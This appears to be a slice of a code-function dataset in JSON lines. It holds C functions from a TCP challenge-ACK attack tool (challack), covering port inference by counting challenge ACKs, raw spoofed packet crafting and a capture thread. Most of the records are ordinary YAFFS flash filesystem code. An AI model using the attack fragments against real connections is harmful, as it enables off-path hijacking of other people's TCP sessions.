{\n\t\t\t\t\tgettimeofday(&now, NULL);\n\t\t\t\t\ttimersub(&now, &infer_start, &diff);\n\t\t\t\t\tprintf(\"[*] Confirmed client port (via chunk): %lu (after %lu %lu)\\n\",\n\t\t\t\t\t\t\tbs_start, diff.tv_sec, diff.tv_usec);\n\t\t\t\t\t*pport = ntohs(bs_start);\n\t\t\t\t\treturn 1;\n\t\t\t\t}\n\t\t\t\ttest_mode = 2;\n\t\t\t} else if (test_mode == 2) {\n\t\t\t\tif (bs_end - bs_mid == 1) {\n\t\t\t\t\t/* we legitimately guessed it via binary search! */\n\t\t\t\t\tgettimeofday(&now, NULL);\n\t\t\t\t\ttimersub(&now, &infer_start, &diff);\n\t\t\t\t\tprintf(\"[*] Guessed client port (via binary search): %lu (after %lu %lu)\\n\",\n\t\t\t\t\t\t\tbs_mid, diff.tv_sec, diff.tv_usec);\n\t\t\t\t\t*pport = ntohs(bs_start);\n\t\t\t\t\treturn 1;\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t\t/* adjust range */\n\t\t\t\t\tbs_start = bs_mid;\n\t\t\t}\n\t\t} else {\n\t\t\t// XXX: TODO: scale number of guesses per round based on feedback\n\t\t\tfprintf(stderr, \"[!] invalid challenge ACK count! retrying range...\\n\");\n\t\t\tg_chack_cnt = 0;\n\t\t}\n\t}\n\n\t/* fail! */\n\treturn 0;\n}", "path": "challack.c", "repo_name": "jduck/challack", "stars": 71, "license": "None", "language": "c", "size": 228}
{"docstring": "/*\n * craft a TCP packet based on the given parameters\n *\n * this is based on Matt Barrie's old non-working TCPseqnumpred.c\n * the problem with that program was not this function however..\n */\n", "func_signal": "int tcp_craft(void *output, size_t *outlen, volatile conn_t *pconn, u_char flags, char *data, size_t len)", "code": "{\n\tstruct ip ip;\n\tstruct tcphdr tcp;\n\tchar tcpbuf[4096], *ptr;\n\tuint16_t size;\n\n\t/* buffer too small? */\n\tif (*outlen < sizeof(ip) + sizeof(tcp) + len) {\n\t\tfprintf(stderr, \"tcp_craft: buffer too small!!\\n\");\n\t\treturn 0;\n\t}\n\n\t/* construct the IP header */\n\tip.ip_hl = sizeof(ip) / 4;\n\tip.ip_v = 4;\n\tip.ip_tos = 0;\n\tip.ip_len = htons(sizeof(ip) + sizeof(tcp) + len);\n\tip.ip_id = htons(pconn->id);\n\tpconn->id++;\n\tip.ip_off = 0;\n\tip.ip_ttl = 255;\n\tip.ip_p = IPPROTO_TCP;\n\tip.ip_sum = 0;\n\tip.ip_src.s_addr = pconn->src.sin_addr.s_addr;\n\tip.ip_dst.s_addr = pconn->dst.sin_addr.s_addr;\n\n\t/* calculate the IP checksum */\n\tip.ip_sum = in_cksum((uint16_t *)&ip, sizeof(ip));\n\n\t/* construct the TCP header */\n\ttcp.th_sport = pconn->src.sin_port;\n\ttcp.th_dport = pconn->dst.sin_port;\n\ttcp.th_seq = htonl(pconn->seq);\n\ttcp.th_ack = htonl(pconn->ack);\n\ttcp.th_x2 = 0;\n\ttcp.th_off = 5;\n\ttcp.th_flags = flags;\n\ttcp.th_win = htons(10052);\n\ttcp.th_sum = 0;\n\ttcp.th_urp = 0;\n\n\t/* calculate the TCP checksum */\n\tptr = tcpbuf;\n\tmemset(tcpbuf, 0, sizeof(tcpbuf));\n\tmemcpy(ptr, &(ip.ip_src.s_addr), 8);\n\tptr += 9;\n\t*ptr++ = ip.ip_p;\n\tsize = htons(len + sizeof(tcp));\n\tmemcpy(ptr, &size, 2);\n\tptr += 2;\n\tmemcpy(ptr, &tcp, sizeof(tcp));\n\tptr += sizeof(tcp);\n\tmemcpy(ptr, data, len);\n\ttcp.th_sum = in_cksum((uint16_t *)tcpbuf, sizeof(tcp) + 12 + len);\n\n\t/* build the final packet */\n\tptr = output;\n\tmemcpy(ptr, &ip, sizeof(ip));\n\tptr += sizeof(ip);\n\tmemcpy(ptr, &tcp, sizeof(tcp));\n\tptr += sizeof(tcp);\n\tmemcpy(ptr, data, len);\n\n\t*outlen = ((void *)ptr - output) + len;\n\n#ifdef DEBUG_SEQ_OUT\n\t{\n\t\tchar shost[32], dhost[32];\n\n\t\tstrcpy(shost, inet_ntoa(pconn->src.sin_addr));\n\t\tstrcpy(dhost, inet_ntoa(pconn->dst.sin_addr));\n\t\tprintf(\"[*] %s : %s:%d --> %s:%d : %s : seq %lu, ack %lu (len %lu)\\n\",\n\t\t\t\tg_conn_states[pconn->state],\n\t\t\t\tshost, ntohs(tcp.th_sport),\n\t\t\t\tdhost, ntohs(tcp.th_dport),\n\t\t\t\ttcp_flags(tcp.th_flags), (u_long)pconn->seq,\n\t\t\t\t(u_long)pconn->ack, (u_long)len);\n\t}\n#endif\n\n\treturn 1;\n}", "path": "challack.c", "repo_name": "jduck/challack", "stars": 71, "license": "None", "language": "c", "size": 228}
{"docstring": "/*\n * initialize a connection structure from the parameters\n */\n", "func_signal": "void tcp_init(volatile conn_t *pconn, uint32_t seq)", "code": "{\n\tpconn->id = rand() % 0xffff;\n\tpconn->state = CS_NEW;\n\tif (!pconn->seq)\n\t\tpconn->seq = seq;\n}", "path": "challack.c", "repo_name": "jduck/challack", "stars": 71, "license": "None", "language": "c", "size": 228}
{"docstring": "/*\n * a thread to receive packets =)\n */\n", "func_signal": "void *recv_thread(void *arg)", "code": "{\n\tstruct pcap_pkthdr *pchdr = NULL;\n\tconst u_char *inbuf = NULL;\n\tint pcret;\n\tu_char flags;\n\tsize_t datalen;\n\n\t/* listen for challenge ACKs and count them */\n\twhile (g_ctx.attacking) {\n\t\tpcret = pcap_next_ex(g_ctx.pch, &pchdr, &inbuf);\n\t\tif (pcret == 1\n\t\t\t&& tcp_recv(pchdr, inbuf, &flags, NULL, NULL, NULL, &datalen)\n\t\t\t&& flags == TH_ACK) {\n\t\t\tg_chack_cnt++;\n\t\t}\n\t}\n\n\t/* not reached */\n\treturn NULL;\n}", "path": "challack.c", "repo_name": "jduck/challack", "stars": 71, "license": "None", "language": "c", "size": 228}
{"docstring": "/*\n * load all the data from the specified file into a heap buffer\n */\n", "func_signal": "char *slurp(char *file, off_t *plen)", "code": "{\n\tstruct stat sb;\n\tint fd;\n\tchar *pbuf;\n\tssize_t nr;\n\n\tif (stat(file, &sb) == -1) {\n\t\tperror(\"[!] stat\");\n\t\treturn NULL;\n\t}\n\n\tif (!S_ISREG(sb.st_mode)) {\n\t\tfprintf(stderr, \"[!] \\\"%s\\\" is not a file.\\n\", file);\n\t\treturn NULL;\n\t}\n\n\tif (!(pbuf = (char *)malloc(sb.st_size))) {\n\t\tperror(\"[!] malloc\");\n\t\treturn NULL;\n\t}\n\n\tif ((fd = open(file, O_RDONLY)) == -1) {\n\t\tperror(\"[!] open\");\n\t\tfree(pbuf);\n\t\treturn NULL;\n\t}\n\n\tnr = read(fd, pbuf, sb.st_size);\n\tif (nr != sb.st_size) {\n\t\tif (nr < 0)\n\t\t\tperror(\"[!] read\");\n\t\telse\n\t\t\tfprintf(stderr, \"[!] short read!\\n\");\n\t\treturn NULL;\n\t}\n\n\t*plen = sb.st_size;\n\treturn pbuf;\n}", "path": "challack.c", "repo_name": "jduck/challack", "stars": 71, "license": "None", "language": "c", "size": 228}
{"docstring": "/*\n *  A note or two on object names.\n *  * If the object name is missing, we then make one up in the form objnnn\n *\n *  * ASCII names are stored in the object header's name field from byte zero\n *  * Unicode names are historically stored starting from byte zero.\n *\n * Then there are automatic Unicode names...\n * The purpose of these is to save names in a way that can be read as\n * ASCII or Unicode names as appropriate, thus allowing a Unicode and ASCII\n * system to share files.\n *\n * These automatic unicode are stored slightly differently...\n *  - If the name can fit in the ASCII character space then they are saved as \n *    ascii names as per above.\n *  - If the name needs Unicode then the name is saved in Unicode\n *    starting at oh->name[1].\n\n */\n", "func_signal": "static void yaffs_FixNullName(yaffs_Object * obj,YCHAR * name, int buffSize)", "code": "{\n\t/* Create an object name if we could not find one. */\n\tif(yaffs_strnlen(name,YAFFS_MAX_NAME_LENGTH) == 0){\n\t\tYCHAR locName[20];\n\t\tYCHAR numString[20];\n\t\tYCHAR *x = &numString[19];\n\t\tunsigned v = obj->objectId;\n\t\tnumString[19] = 0;\n\t\twhile(v>0){\n\t\t\tx--;\n\t\t\t*x = '0' + (v % 10);\n\t\t\tv /= 10;\n\t\t}\n\t\t/* make up a name */\n\t\tyaffs_strcpy(locName, YAFFS_LOSTNFOUND_PREFIX);\n\t\tyaffs_strcat(locName,x);\n\t\tyaffs_strncpy(name, locName, buffSize - 1);\n\t}\n}", "path": "yaffs_guts.c", "repo_name": "signalapp/WhisperYAFFS", "stars": 104, "license": "None", "language": "c", "size": 344}
{"docstring": "/* UpdateObjectHeader updates the header on NAND for an object.\n * If name is not NULL, then that new name is used.\n */\n", "func_signal": "int yaffs_UpdateObjectHeader(yaffs_Object *in, const YCHAR *name, int force,\n\t\t\t     int isShrink, int shadows, yaffs_XAttrMod *xmod)", "code": "{\n\n\tyaffs_BlockInfo *bi;\n\n\tyaffs_Device *dev = in->myDev;\n\n\tint prevChunkId;\n\tint retVal = 0;\n\tint result = 0;\n\n\tint newChunkId;\n\tyaffs_ExtendedTags newTags;\n\tyaffs_ExtendedTags oldTags;\n\tconst YCHAR *alias = NULL;\n\n\t__u8 *buffer = NULL;\n\tYCHAR oldName[YAFFS_MAX_NAME_LENGTH + 1];\n\n\tyaffs_ObjectHeader *oh = NULL;\n\n\tyaffs_strcpy(oldName, _Y(\"silly old name\"));\n\n\n\tif (!in->fake ||\n\t\tin == dev->rootDir || /* The rootDir should also be saved */\n\t\tforce  || xmod) {\n\n\t\tyaffs_CheckGarbageCollection(dev,0);\n\t\tyaffs_CheckObjectDetailsLoaded(in);\n\n\t\tbuffer = yaffs_GetTempBuffer(in->myDev, __LINE__);\n\t\toh = (yaffs_ObjectHeader *) buffer;\n\n\t\tprevChunkId = in->hdrChunk;\n\n\t\tif (prevChunkId > 0) {\n\t\t\tresult = yaffs_ReadChunkWithTagsFromNAND(dev, prevChunkId,\n\t\t\t\t\t\t\tbuffer, &oldTags);\n\n\t\t\tyaffs_VerifyObjectHeader(in, oh, &oldTags, 0);\n\n\t\t\tmemcpy(oldName, oh->name, sizeof(oh->name));\n\t\t\tmemset(buffer, 0xFF, sizeof(yaffs_ObjectHeader));\n\t\t} else\n\t\t\tmemset(buffer, 0xFF, dev->nDataBytesPerChunk);\n\n\t\toh->type = in->variantType;\n\t\toh->yst_mode = in->yst_mode;\n\t\toh->shadowsObject = oh->inbandShadowsObject = shadows;\n\n#ifdef CONFIG_YAFFS_WINCE\n\t\toh->win_atime[0] = in->win_atime[0];\n\t\toh->win_ctime[0] = in->win_ctime[0];\n\t\toh->win_mtime[0] = in->win_mtime[0];\n\t\toh->win_atime[1] = in->win_atime[1];\n\t\toh->win_ctime[1] = in->win_ctime[1];\n\t\toh->win_mtime[1] = in->win_mtime[1];\n#else\n\t\toh->yst_uid = in->yst_uid;\n\t\toh->yst_gid = in->yst_gid;\n\t\toh->yst_atime = in->yst_atime;\n\t\toh->yst_mtime = in->yst_mtime;\n\t\toh->yst_ctime = in->yst_ctime;\n\t\toh->yst_rdev = in->yst_rdev;\n#endif\n\t\tif (in->parent)\n\t\t\toh->parentObjectId = in->parent->objectId;\n\t\telse\n\t\t\toh->parentObjectId = 0;\n\n\t\tif (name && *name) {\n\t\t\tmemset(oh->name, 0, sizeof(oh->name));\n\t\t\tyaffs_LoadObjectHeaderFromName(dev,oh->name,name);\n\t\t} else if (prevChunkId > 0)\n\t\t\tmemcpy(oh->name, oldName, sizeof(oh->name));\n\t\telse\n\t\t\tmemset(oh->name, 0, sizeof(oh->name));\n\n\t\toh->isShrink = isShrink;\n\n\t\tswitch (in->variantType) {\n\t\tcase YAFFS_OBJECT_TYPE_UNKNOWN:\n\t\t\t/* Should not happen */\n\t\t\tbreak;\n\t\tcase YAFFS_OBJECT_TYPE_FILE:\n\t\t\toh->fileSize =\n\t\t\t    (oh->parentObjectId == YAFFS_OBJECTID_DELETED\n\t\t\t     || oh->parentObjectId ==\n\t\t\t     YAFFS_OBJECTID_UNLINKED) ? 0 : in->variant.\n\t\t\t    fileVariant.fileSize;\n\t\t\tbreak;\n\t\tcase YAFFS_OBJECT_TYPE_HARDLINK:\n\t\t\toh->equivalentObjectId =\n\t\t\t    in->variant.hardLinkVariant.equivalentObjectId;\n\t\t\tbreak;\n\t\tcase YAFFS_OBJECT_TYPE_SPECIAL:\n\t\t\t/* Do nothing */\n\t\t\tbreak;\n\t\tcase YAFFS_OBJECT_TYPE_DIRECTORY:\n\t\t\t/* Do nothing */\n\t\t\tbreak;\n\t\tcase YAFFS_OBJECT_TYPE_SYMLINK:\n\t\t\talias = in->variant.symLinkVariant.alias;\n\t\t\tif(!alias)\n\t\t\t\talias = _Y(\"no alias\");\n\t\t\tyaffs_strncpy(oh->alias,\n\t\t\t\t\talias,\n\t\t\t\t      YAFFS_MAX_ALIAS_LENGTH);\n\t\t\toh->alias[YAFFS_MAX_ALIAS_LENGTH] = 0;\n\t\t\tbreak;\n\t\t}\n\n\t\t/* process any xattrib modifications */\n\t\tif(xmod)\n\t\t\tyaffs_ApplyXMod(in, (char *)buffer, xmod);\n\n\n\t\t/* Tags */\n\t\tyaffs_InitialiseTags(&newTags);\n\t\tin->serial++;\n\t\tnewTags.chunkId = 0;\n\t\tnewTags.objectId = in->objectId;\n\t\tnewTags.serialNumber = in->serial;\n\n\t\t/* Add extra info for file header */\n\n\t\tnewTags.extraHeaderInfoAvailable = 1;\n\t\tnewTags.extraParentObjectId = oh->parentObjectId;\n\t\tnewTags.extraFileLength = oh->fileSize;\n\t\tnewTags.extraIsShrinkHeader = oh->isShrink;\n\t\tnewTags.extraEquivalentObjectId = oh->equivalentObjectId;\n\t\tnewTags.extraShadows = (oh->shadowsObject > 0) ? 1 : 0;\n\t\tnewTags.extraObjectType = in->variantType;\n\n\t\tyaffs_VerifyObjectHeader(in, oh, &newTags, 1);\n\n\t\t/* Create new chunk in NAND */\n\t\tnewChunkId =\n\t\t    yaffs_WriteNewChunkWithTagsToNAND(dev, buffer, &newTags,\n\t\t\t\t\t\t      (prevChunkId > 0) ? 1 : 0);\n\n\t\tif (newChunkId >= 0) {\n\n\t\t\tin->hdrChunk = newChunkId;\n\n\t\t\tif (prevChunkId > 0) {\n\t\t\t\tyaffs_DeleteChunk(dev, prevChunkId, 1,\n\t\t\t\t\t\t  __LINE__);\n\t\t\t}\n\n\t\t\tif (!yaffs_ObjectHasCachedWriteData(in))\n\t\t\t\tin->dirty = 0;\n\n\t\t\t/* If this was a shrink, then mark the block that the chunk lives on */\n\t\t\tif (isShrink) {\n\t\t\t\tbi = yaffs_GetBlockInfo(in->myDev,\n\t\t\t\t\tnewChunkId / in->myDev->param.nChunksPerBlock);\n\t\t\t\tbi->hasShrinkHeader = 1;\n\t\t\t}\n\n\t\t}\n\n\t\tretVal = newChunkId;\n\n\t}\n\n\tif (buffer)\n\t\tyaffs_ReleaseTempBuffer(dev, buffer, __LINE__);\n\n\treturn retVal;\n}", "path": "yaffs_guts.c", "repo_name": "signalapp/WhisperYAFFS", "stars": 104, "license": "None", "language": "c", "size": 344}
{"docstring": "/*\n * Delete directory contents for cleaning up lost and found.\n */\n", "func_signal": "static void yaffs_DeleteDirectoryContents(yaffs_Object *dir)", "code": "{\n\tyaffs_Object *obj;\n\tstruct ylist_head *lh;\n\tstruct ylist_head *n;\n\n\tif(dir->variantType != YAFFS_OBJECT_TYPE_DIRECTORY)\n\t\tYBUG();\n\t\n\tylist_for_each_safe(lh, n, &dir->variant.directoryVariant.children) {\n\t\tif (lh) {\n\t\t\tobj = ylist_entry(lh, yaffs_Object, siblings);\n\t\t\tif(obj->variantType == YAFFS_OBJECT_TYPE_DIRECTORY)\n\t\t\t\tyaffs_DeleteDirectoryContents(obj);\n\n\t\t\tT(YAFFS_TRACE_SCAN,\n\t\t\t\t(TSTR(\"Deleting lost_found object %d\" TENDSTR),\n\t\t\t\tobj->objectId));\n\n\t\t\t/* Need to use UnlinkObject since Delete would not handle\n\t\t\t * hardlinked objects correctly.\n\t\t\t */\n\t\t\tyaffs_UnlinkObject(obj); \n\t\t}\n\t}\n\t\t\t\n}", "path": "yaffs_guts.c", "repo_name": "signalapp/WhisperYAFFS", "stars": 104, "license": "None", "language": "c", "size": 344}
{"docstring": "/* Experimental code not being used yet. Might speed up file deletion */\n/* DeleteWorker scans backwards through the tnode tree and deletes all the\n * chunks and tnodes in the file.\n * Returns 1 if the tree was deleted.\n * Returns 0 if it stopped early due to hitting the limit and the delete is incomplete.\n */\n", "func_signal": "static int yaffs_DeleteWorker(yaffs_Object *in, yaffs_Tnode *tn, __u32 level,\n\t\t\t      int chunkOffset, int *limit)", "code": "{\n\tint i;\n\tint chunkInInode;\n\tint theChunk;\n\tyaffs_ExtendedTags tags;\n\tint foundChunk;\n\tyaffs_Device *dev = in->myDev;\n\n\tint allDone = 1;\n\n\tif (tn) {\n\t\tif (level > 0) {\n\t\t\tfor (i = YAFFS_NTNODES_INTERNAL - 1; allDone && i >= 0;\n\t\t\t     i--) {\n\t\t\t\tif (tn->internal[i]) {\n\t\t\t\t\tif (limit && (*limit) < 0) {\n\t\t\t\t\t\tallDone = 0;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tallDone =\n\t\t\t\t\t\t\tyaffs_DeleteWorker(in,\n\t\t\t\t\t\t\t\ttn->\n\t\t\t\t\t\t\t\tinternal\n\t\t\t\t\t\t\t\t[i],\n\t\t\t\t\t\t\t\tlevel -\n\t\t\t\t\t\t\t\t1,\n\t\t\t\t\t\t\t\t(chunkOffset\n\t\t\t\t\t\t\t\t\t<<\n\t\t\t\t\t\t\t\t\tYAFFS_TNODES_INTERNAL_BITS)\n\t\t\t\t\t\t\t\t+ i,\n\t\t\t\t\t\t\t\tlimit);\n\t\t\t\t\t}\n\t\t\t\t\tif (allDone) {\n\t\t\t\t\t\tyaffs_FreeTnode(dev,\n\t\t\t\t\t\t\t\ttn->\n\t\t\t\t\t\t\t\tinternal[i]);\n\t\t\t\t\t\ttn->internal[i] = NULL;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\treturn (allDone) ? 1 : 0;\n\t\t} else if (level == 0) {\n\t\t\tint hitLimit = 0;\n\n\t\t\tfor (i = YAFFS_NTNODES_LEVEL0 - 1; i >= 0 && !hitLimit;\n\t\t\t\t\ti--) {\n\t\t\t\ttheChunk = yaffs_GetChunkGroupBase(dev, tn, i);\n\t\t\t\tif (theChunk) {\n\n\t\t\t\t\tchunkInInode = (chunkOffset <<\n\t\t\t\t\t\tYAFFS_TNODES_LEVEL0_BITS) + i;\n\n\t\t\t\t\tfoundChunk =\n\t\t\t\t\t\tyaffs_FindChunkInGroup(dev,\n\t\t\t\t\t\t\t\ttheChunk,\n\t\t\t\t\t\t\t\t&tags,\n\t\t\t\t\t\t\t\tin->objectId,\n\t\t\t\t\t\t\t\tchunkInInode);\n\n\t\t\t\t\tif (foundChunk > 0) {\n\t\t\t\t\t\tyaffs_DeleteChunk(dev,\n\t\t\t\t\t\t\t\t  foundChunk, 1,\n\t\t\t\t\t\t\t\t  __LINE__);\n\t\t\t\t\t\tin->nDataChunks--;\n\t\t\t\t\t\tif (limit) {\n\t\t\t\t\t\t\t*limit = *limit - 1;\n\t\t\t\t\t\t\tif (*limit <= 0)\n\t\t\t\t\t\t\t\thitLimit = 1;\n\t\t\t\t\t\t}\n\n\t\t\t\t\t}\n\n\t\t\t\t\tyaffs_LoadLevel0Tnode(dev, tn, i, 0);\n\t\t\t\t}\n\n\t\t\t}\n\t\t\treturn (i < 0) ? 1 : 0;\n\n\t\t}\n\n\t}\n\n\treturn 1;\n\n}", "path": "yaffs_guts.c", "repo_name": "signalapp/WhisperYAFFS", "stars": 104, "license": "None", "language": "c", "size": 344}
{"docstring": "/* NOTYET */\n", "func_signal": "int yaffs_TagsCompatabilityWriteChunkWithTagsToNAND(yaffs_Device *dev,\n\t\t\t\t\t\tint chunkInNAND,\n\t\t\t\t\t\tconst __u8 *data,\n\t\t\t\t\t\tconst yaffs_ExtendedTags *eTags)", "code": "{\n\tyaffs_Spare spare;\n\tyaffs_Tags tags;\n\n\tyaffs_SpareInitialise(&spare);\n\n\tif (eTags->chunkDeleted)\n\t\tspare.pageStatus = 0;\n\telse {\n\t\ttags.objectId = eTags->objectId;\n\t\ttags.chunkId = eTags->chunkId;\n\n\t\ttags.byteCountLSB = eTags->byteCount & 0x3ff;\n\n\t\tif (dev->nDataBytesPerChunk >= 1024)\n\t\t\ttags.byteCountMSB = (eTags->byteCount >> 10) & 3;\n\t\telse\n\t\t\ttags.byteCountMSB = 3;\n\n\n\t\ttags.serialNumber = eTags->serialNumber;\n\n\t\tif (!dev->param.useNANDECC && data)\n\t\t\tyaffs_CalcECC(data, &spare);\n\n\t\tyaffs_LoadTagsIntoSpare(&spare, &tags);\n\n\t}\n\n\treturn yaffs_WriteChunkToNAND(dev, chunkInNAND, data, &spare);\n}", "path": "yaffs_tagscompat.c", "repo_name": "signalapp/WhisperYAFFS", "stars": 104, "license": "None", "language": "c", "size": 344}
{"docstring": "/*\n *  Simple hash function. Needs to have a reasonable spread\n */\n", "func_signal": "static Y_INLINE int yaffs_HashFunction(int n)", "code": "{\n\tn = abs(n);\n\treturn n % YAFFS_NOBJECT_BUCKETS;\n}", "path": "yaffs_guts.c", "repo_name": "signalapp/WhisperYAFFS", "stars": 104, "license": "None", "language": "c", "size": 344}
{"docstring": "/*---------------------------- Initialisation code -------------------------------------- */\n", "func_signal": "static int yaffs_CheckDevFunctions(const yaffs_Device *dev)", "code": "{\n\n\t/* Common functions, gotta have */\n\tif (!dev->param.eraseBlockInNAND || !dev->param.initialiseNAND)\n\t\treturn 0;\n\n#ifdef CONFIG_YAFFS_YAFFS2\n\n\t/* Can use the \"with tags\" style interface for yaffs1 or yaffs2 */\n\tif (dev->param.writeChunkWithTagsToNAND &&\n\t    dev->param.readChunkWithTagsFromNAND &&\n\t    !dev->param.writeChunkToNAND &&\n\t    !dev->param.readChunkFromNAND &&\n\t    dev->param.markNANDBlockBad &&\n\t    dev->param.queryNANDBlock)\n\t\treturn 1;\n#endif\n\n\t/* Can use the \"spare\" style interface for yaffs1 */\n\tif (!dev->param.isYaffs2 &&\n\t    !dev->param.writeChunkWithTagsToNAND &&\n\t    !dev->param.readChunkWithTagsFromNAND &&\n\t    dev->param.writeChunkToNAND &&\n\t    dev->param.readChunkFromNAND &&\n\t    !dev->param.markNANDBlockBad &&\n\t    !dev->param.queryNANDBlock)\n\t\treturn 1;\n\n\treturn 0;\t/* bad */\n}", "path": "yaffs_guts.c", "repo_name": "signalapp/WhisperYAFFS", "stars": 104, "license": "None", "language": "c", "size": 344}
{"docstring": "/*-------------------- TNODES -------------------\n\n * List of spare tnodes\n * The list is hooked together using the first pointer\n * in the tnode.\n */\n", "func_signal": "yaffs_Tnode *yaffs_GetTnode(yaffs_Device *dev)", "code": "{\n\tyaffs_Tnode *tn = yaffs_AllocateRawTnode(dev);\n\tif (tn){\n\t\tmemset(tn, 0, dev->tnodeSize);\n\t\tdev->nTnodes++;\n\t}\n\n\tdev->nCheckpointBlocksRequired = 0; /* force recalculation*/\n\n\treturn tn;\n}", "path": "yaffs_guts.c", "repo_name": "signalapp/WhisperYAFFS", "stars": 104, "license": "None", "language": "c", "size": 344}
{"docstring": "/*------------------------ Short Operations Cache ----------------------------------------\n *   In many situations where there is no high level buffering (eg WinCE) a lot of\n *   reads might be short sequential reads, and a lot of writes may be short\n *   sequential writes. eg. scanning/writing a jpeg file.\n *   In these cases, a short read/write cache can provide a huge perfomance benefit\n *   with dumb-as-a-rock code.\n *   In Linux, the page cache provides read buffering aand the short op cache provides write\n *   buffering.\n *\n *   There are a limited number (~10) of cache chunks per device so that we don't\n *   need a very intelligent search.\n */\n", "func_signal": "static int yaffs_ObjectHasCachedWriteData(yaffs_Object *obj)", "code": "{\n\tyaffs_Device *dev = obj->myDev;\n\tint i;\n\tyaffs_ChunkCache *cache;\n\tint nCaches = obj->myDev->param.nShortOpCaches;\n\n\tfor (i = 0; i < nCaches; i++) {\n\t\tcache = &dev->srCache[i];\n\t\tif (cache->object == obj &&\n\t\t    cache->dirty)\n\t\t\treturn 1;\n\t}\n\n\treturn 0;\n}", "path": "yaffs_guts.c", "repo_name": "signalapp/WhisperYAFFS", "stars": 104, "license": "None", "language": "c", "size": 344}
{"docstring": "/*---------------- Name handling functions ------------*/\n", "func_signal": "static __u16 yaffs_CalcNameSum(const YCHAR *name)", "code": "{\n\t__u16 sum = 0;\n\t__u16 i = 1;\n\n\tconst YUCHAR *bname = (const YUCHAR *) name;\n\tif (bname) {\n\t\twhile ((*bname) && (i < (YAFFS_MAX_NAME_LENGTH/2))) {\n\n#ifdef CONFIG_YAFFS_CASE_INSENSITIVE\n\t\t\tsum += yaffs_toupper(*bname) * i;\n#else\n\t\t\tsum += (*bname) * i;\n#endif\n\t\t\ti++;\n\t\t\tbname++;\n\t\t}\n\t}\n\treturn sum;\n}", "path": "yaffs_guts.c", "repo_name": "signalapp/WhisperYAFFS", "stars": 104, "license": "None", "language": "c", "size": 344}
{"docstring": "/* GetEquivalentObject dereferences any hard links to get to the\n * actual object.\n */\n", "func_signal": "yaffs_Object *yaffs_GetEquivalentObject(yaffs_Object *obj)", "code": "{\n\tif (obj && obj->variantType == YAFFS_OBJECT_TYPE_HARDLINK) {\n\t\t/* We want the object id of the equivalent object, not this one */\n\t\tobj = obj->variant.hardLinkVariant.equivalentObject;\n\t\tyaffs_CheckObjectDetailsLoaded(obj);\n\t}\n\treturn obj;\n}", "path": "yaffs_guts.c", "repo_name": "signalapp/WhisperYAFFS", "stars": 104, "license": "None", "language": "c", "size": 344}
{"docstring": "/*\n * Mknod (create) a new object.\n * equivalentObject only has meaning for a hard link;\n * aliasString only has meaning for a symlink.\n * rdev only has meaning for devices (a subset of special objects)\n */\n", "func_signal": "static yaffs_Object *yaffs_MknodObject(yaffs_ObjectType type,\n\t\t\t\t       yaffs_Object *parent,\n\t\t\t\t       const YCHAR *name,\n\t\t\t\t       __u32 mode,\n\t\t\t\t       __u32 uid,\n\t\t\t\t       __u32 gid,\n\t\t\t\t       yaffs_Object *equivalentObject,\n\t\t\t\t       const YCHAR *aliasString, __u32 rdev)", "code": "{\n\tyaffs_Object *in;\n\tYCHAR *str = NULL;\n\n\tyaffs_Device *dev = parent->myDev;\n\n\t/* Check if the entry exists. If it does then fail the call since we don't want a dup.*/\n\tif (yaffs_FindObjectByName(parent, name))\n\t\treturn NULL;\n\n\tif (type == YAFFS_OBJECT_TYPE_SYMLINK) {\n\t\tstr = yaffs_CloneString(aliasString);\n\t\tif (!str)\n\t\t\treturn NULL;\n\t}\n\n\tin = yaffs_CreateNewObject(dev, -1, type);\n\n\tif (!in){\n\t\tif(str)\n\t\t\tYFREE(str);\n\t\treturn NULL;\n\t}\n\n\n\n\n\n\tif (in) {\n\t\tin->hdrChunk = 0;\n\t\tin->valid = 1;\n\t\tin->variantType = type;\n\n\t\tin->yst_mode = mode;\n\n#ifdef CONFIG_YAFFS_WINCE\n\t\tyfsd_WinFileTimeNow(in->win_atime);\n\t\tin->win_ctime[0] = in->win_mtime[0] = in->win_atime[0];\n\t\tin->win_ctime[1] = in->win_mtime[1] = in->win_atime[1];\n\n#else\n\t\tin->yst_atime = in->yst_mtime = in->yst_ctime = Y_CURRENT_TIME;\n\n\t\tin->yst_rdev = rdev;\n\t\tin->yst_uid = uid;\n\t\tin->yst_gid = gid;\n#endif\n\t\tin->nDataChunks = 0;\n\n\t\tyaffs_SetObjectName(in, name);\n\t\tin->dirty = 1;\n\n\t\tyaffs_AddObjectToDirectory(parent, in);\n\n\t\tin->myDev = parent->myDev;\n\n\t\tswitch (type) {\n\t\tcase YAFFS_OBJECT_TYPE_SYMLINK:\n\t\t\tin->variant.symLinkVariant.alias = str;\n\t\t\tbreak;\n\t\tcase YAFFS_OBJECT_TYPE_HARDLINK:\n\t\t\tin->variant.hardLinkVariant.equivalentObject =\n\t\t\t\tequivalentObject;\n\t\t\tin->variant.hardLinkVariant.equivalentObjectId =\n\t\t\t\tequivalentObject->objectId;\n\t\t\tylist_add(&in->hardLinks, &equivalentObject->hardLinks);\n\t\t\tbreak;\n\t\tcase YAFFS_OBJECT_TYPE_FILE:\n\t\tcase YAFFS_OBJECT_TYPE_DIRECTORY:\n\t\tcase YAFFS_OBJECT_TYPE_SPECIAL:\n\t\tcase YAFFS_OBJECT_TYPE_UNKNOWN:\n\t\t\t/* do nothing */\n\t\t\tbreak;\n\t\t}\n\n\t\tif (yaffs_UpdateObjectHeader(in, name, 0, 0, 0, NULL) < 0) {\n\t\t\t/* Could not create the object header, fail the creation */\n\t\t\tyaffs_DeleteObject(in);\n\t\t\tin = NULL;\n\t\t}\n\n\t\tyaffs_UpdateParent(parent);\n\t}\n\n\treturn in;\n}", "path": "yaffs_guts.c", "repo_name": "signalapp/WhisperYAFFS", "stars": 104, "license": "None", "language": "c", "size": 344}
